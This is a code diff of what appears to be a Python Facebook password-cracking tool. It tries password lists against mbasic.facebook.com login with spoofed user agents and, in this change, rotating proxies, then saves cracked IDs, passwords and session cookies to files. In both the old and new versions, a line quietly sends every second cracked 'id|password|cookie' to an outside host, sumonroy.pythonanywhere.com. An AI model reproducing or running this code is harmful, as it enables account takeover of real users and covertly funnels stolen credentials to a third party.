@@ -1403,8 +1403,8 @@ def p(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ua = random.choice(uas)
-            pro = random.choice(SUMONua)
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
@@ -1433,7 +1433,7 @@ def p(uid,pwx,tl):
             'fmt': '1',
             'a': 'AYkBCKTyaI-c_gl9jVJypyDSApvws4LGRE1lFS92AO9xgLBWo1pYhHGTpsowMEEvHlmC2r72SQ3Iy1NregNCELsxIGVS9npiQTJRu6iIg-xVWw',
             'user': '0'}
-            headers ={
+            headers = {
             'Host': 'mbasic.facebook.com',
             'user-agent': "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+"Mobile Safari/537.36",
             'Accept-Encoding': 'gzip',
@@ -1463,7 +1463,7 @@ def p(uid,pwx,tl):
             'Content-Type': 'application/x-www-form-urlencoded'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://mbasic.facebook.com/login/device-based/login/async/"
-            po = Session.post(url, data=data, headers=headers).text
+            po = Session.post(url, data=data, headers=headers, allow_redirects=False, proxies=proxs).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1471,21 +1471,26 @@ def p(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                   bkas.append(cid)
-                   if len(bkas)% 2 == 0:
-                      statusok = (f"{cid}|{pw}|{coki}")
-                      requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                   else:
-                      print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                      print(f" {green}Cookie : {green}{coki}")
-                      open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                      oks.append(cid)
-                      break
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
+                    else:
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
